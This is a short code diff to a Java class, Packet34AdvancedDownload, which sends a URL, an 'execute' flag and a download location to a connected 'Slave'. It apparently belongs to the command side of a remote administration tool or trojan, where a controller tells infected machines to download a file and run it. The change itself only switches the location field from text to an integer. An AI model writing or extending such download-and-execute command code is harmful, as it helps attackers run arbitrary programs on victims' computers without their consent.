@@ -9,9 +9,9 @@ public class Packet34AdvancedDownload extends AbstractOutgoingPacket {
 
 	private String url;
 	private boolean execute;
-	private String location;
+	private int location;
 
-	public Packet34AdvancedDownload(String url, boolean execute, String location) {
+	public Packet34AdvancedDownload(String url, boolean execute, int location) {
 		this.url = url;
 		this.execute = execute;
 		this.location = location;
@@ -21,7 +21,7 @@ public class Packet34AdvancedDownload extends AbstractOutgoingPacket {
 	public void write(Slave slave, DataOutputStream dos) throws Exception {
 		slave.writeLine(url);
 		dos.writeBoolean(execute);
-		slave.writeLine(location);
+		dos.writeInt(location);
 	}
 
 	@Override
